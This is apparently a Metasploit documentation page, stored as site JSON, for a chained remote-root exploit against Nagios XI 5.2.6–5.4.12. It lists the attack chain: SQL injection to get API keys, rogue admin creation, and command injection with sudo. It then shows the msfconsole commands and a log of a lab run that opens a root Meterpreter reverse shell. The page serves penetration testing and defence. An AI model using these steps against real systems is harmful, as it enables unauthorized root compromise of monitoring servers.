{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo","result":{"data":{"moduleMetadataJson":{"id":"88a3c92b-46c3-53aa-ade3-166080e93550","name":"Nagios XI Chained Remote Code Execution","fullname":"exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo","description":"This module exploits a few different vulnerabilities in Nagios XI 5.2.6-5.4.12 to gain remote root access.\n        The steps are:\n          1. Issue a POST request to /nagiosql/admin/settings.php which sets the database user to root.\n          2. SQLi on /nagiosql/admin/helpedit.php allows us to enumerate API keys.\n          3. The API keys are then used to add an administrative user.\n          4. An authenticated session is established with the newly added user\n          5. Command Injection on /nagiosxi/backend/index.php allows us to execute the payload with nopasswd sudo,\n          giving us a root shell.\n          6. Remove the added admin user and reset the database user.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo","documentationSlug":"/modules/documentation/exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Nagios XI 5.2.6 - 5.4.12 Chained Remote Root RCE</p>\n<p>  This exploit combines many different vulnerabilities in Nagios XI to\ngain remote root access to the affected host. The process is:</p>\n<ol>\n<li>Reset the database user to root.</li>\n<li>Exploit SQL injection to extract api keys.</li>\n<li>Use api key to add administrative user.</li>\n<li>Authenticate to application using newly added user.</li>\n<li>Exploit command injection and sudo misconfiguration\nto get remote root shell.</li>\n<li>Remove added admin user, and reset database user.</li>\n</ol>\n<p>  See <a href=\"http://blog.redactedsec.net/exploits/2018/04/26/nagios.html\">our blog post</a> for more information</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li><code class=\"language-text\">use exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo</code></li>\n<li><code class=\"language-text\">set rhost &lt;IP&gt;</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n<li>A meterpreter session should have been opened successfully</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"nagios-527-on-centos-67\" style=\"position:relative;\"><a href=\"#nagios-527-on-centos-67\" aria-label=\"nagios 527 on centos 67 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Nagios 5.2.7 on CentOS 6.7</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo\nmsf5 exploit(linux/http/nagios_xi_chained_rce_2_electric_boogaloo) &gt; set rhost 172.22.222.182\nrhost =&gt; 172.22.222.182\nmsf5 exploit(linux/http/nagios_xi_chained_rce_2_electric_boogaloo) &gt; run\n\n[*] Started reverse TCP handler on 172.22.222.177:4444\n[*] Command Stager progress - 100.00% done (705/705 bytes)\n[*] Sending stage (857352 bytes) to 172.22.222.182\n[*] Meterpreter session 1 opened (172.22.222.177:4444 -&gt; 172.22.222.182:35262) at 2018-06-29 11:04:03 -0500\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : localhost.localdomain\nOS           : CentOS 6.9 (Linux 2.6.32-696.10.2.el6.x86_64)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"88a3c92b-46c3-53aa-ade3-166080e93550"}}}